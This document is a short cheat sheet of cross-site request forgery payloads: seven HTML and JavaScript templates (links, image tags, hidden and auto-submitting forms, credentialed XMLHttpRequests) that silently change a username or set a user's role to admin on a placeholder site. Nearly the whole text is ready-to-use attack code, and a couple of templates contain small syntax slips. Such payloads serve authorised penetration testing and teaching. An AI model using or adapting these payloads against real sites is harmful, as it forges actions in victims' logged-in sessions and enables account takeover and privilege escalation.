## 1. HTML GET - Requiring User Interaction
```
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```
## 2. HTML GET - No User Interaction
```
<img src="http://www.example.com/api/setusername?username=CSRFd">
```
## 3. HTML POST – Requiring User Interaction for Proof-of-Concept
```
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
<input name="username" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>
```
## 4. HTML POST (AutoSubmit – No User Interaction)
```
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST"&>
<input name="username" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>

<script>
document.getElementById("autosubmit").submit();
</script>
```
## 5. JSON GET – Simple Request
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```
## 6. JSON POST – Simple Request
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```
## 7. JSON POST – Complex Request
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

### References: 
https://trustfoundry.net/2016/04/03/cross-site-request-forgery-cheat-sheet/
